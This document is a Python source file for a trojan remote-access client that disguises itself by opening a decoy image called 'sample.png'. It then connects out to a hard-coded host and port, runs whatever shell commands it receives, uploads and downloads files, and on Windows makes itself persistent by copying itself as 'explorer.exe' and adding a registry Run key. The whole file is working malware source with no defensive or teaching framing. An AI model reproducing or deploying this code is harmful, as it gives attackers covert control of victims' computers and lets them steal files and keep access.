import sys


from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from subprocess import Popen, run, check_output, call, DEVNULL
from os import chdir, devnull, environ, path
from shutil import copyfile
from platform import system, release
from pathlib import Path
from base64 import b64decode, b64encode
from typing import NamedTuple, List
from json import dumps, loads


class Client(object):
    def __init__(self, platform: str = '', release: str = '', ip: str = '', port: int = ''):
        self.env = f'{platform}: {release}'
        self.release = release
        self.connection = socket(AF_INET, SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        if 'Windows' in self.env:
            file_loc = environ["appdata"] + "\\explorer.exe"
            if not path.exists(file_loc):
                copyfile(sys.executable, file_loc)
                call([
                    f'reg add',
                    f'HKCV\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    f'/v name',
                    f'/t REG_SZ',
                    f'/d "{file_loc}"']
                )
        if 'Linux' in self.env:
            raise NotImplementedError('TODO')
        if 'Darwin' in self.env:
            raise NotImplementedError('TODO')

    def send(self, data: bytes) -> None:
        json_data = dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def receive(self) -> None:
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return loads(json_data)
            except ValueError:
                continue

    def exec(self, cmd: List[str]) -> str:
        DEVNULL = open(devnull, 'wb')
        return check_output([' '.join(cmd)], stderr=DEVNULL, stdin=DEVNULL)
    
    def change_working_dir(self, path : str) -> str:
        chdir(path)
        return f'[+] Working dir changed to {path}'

    def write(self, path: str, content: str) -> str:
        with open(path, 'wb') as out_file:
            out_file.write(b64decode(content))
            return f'[+] Upload succesful'
    
    def read(self, path: str) -> bytes:
        with open(path, 'rb') as in_file:
            content = in_file.read()
            return b64encode(content)

    def run(self):
        while True:
            cmd = self.receive()
            try:
                if cmd[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif cmd[0] == 'cd' and len(cmd) > 1:
                    result = self.change_working_dir(cmd[1])
                elif cmd[0] == 'download':
                    result = self.read(cmd[1]).decode()
                elif cmd[0] == 'upload':
                    result = self.write(cmd[1], cmd[2])
                else:
                    result = self.exec(cmd).decode()
            except Exception as e:
                result = f'[-] Error occured during cmd exec: \n\t{e}'
            self.send(result)


def open_front_file(file_path: Path, env: str):
    if 'Linux' in env:
        run(['xdg-open', file_path], check=True)
    elif 'Windows' in env:
        run(['open', file_path], check=True)
    elif 'Dawrin' in env:
        run(['open', file_path], check=True)


def main(*args, **kwargs) -> None:
    platform, version = system(), release()
    env = f'{system()}: {release()}'
    file_name = 'sample.png'
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        file_path = Path(sys._MEIPASS) # pylint: disable=no-member
    else:
        file_path = Path(__file__).parent

    front_file = Path.cwd() / file_path / file_name
    open_front_file(front_file, env)

    try:
        client = Client(platform, version, '10.0.2.15', 7777)
        client.run()
    except Exception as e:
        sys.exit()


if __name__ == "__main__":
    main()